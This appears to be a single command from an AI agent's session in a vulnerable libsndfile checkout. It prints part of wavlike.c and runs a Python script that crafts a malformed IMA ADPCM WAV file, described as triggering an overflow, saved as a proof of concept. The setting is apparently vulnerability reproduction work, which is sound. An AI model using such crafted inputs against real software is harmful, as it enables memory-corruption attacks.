message:
Running command: cd /workspace/repo-vul/src-vul/libsndfile && nl -ba src/wavlike.c | sed -n '100,135p' && python3 - <<'PY'
import struct
# WAV IMA ADPCM stereo blockalign 12 samplesperblock 5, malformed block group causes overflow
fmt = struct.pack('<HHIIHHHH', 0x11, 2, 8000, 19200, 12, 4, 2, 5)
data = bytes([0]*12)
chunks = b'fmt ' + struct.pack('<I', len(fmt)) + fmt + b'data' + struct.pack('<I', len(data)) + data
wav = b'RIFF' + struct.pack('<I', 4 + len(chunks)) + b'WAVE' + chunks
open('/workspace/poc.wav','wb').write(wav)
print(len(wav), wav[:64].hex())
PY
file /workspace/poc.wav && xxd /workspace/poc.wav
